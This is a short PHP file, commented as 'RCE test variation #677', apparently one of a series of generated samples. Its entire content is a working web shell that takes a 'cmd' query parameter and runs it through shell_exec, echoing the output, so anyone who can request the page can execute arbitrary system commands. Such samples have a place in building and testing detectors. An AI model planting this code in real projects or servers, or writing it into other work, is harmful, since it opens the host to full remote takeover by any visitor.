<?php
// RCE test variation #677
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>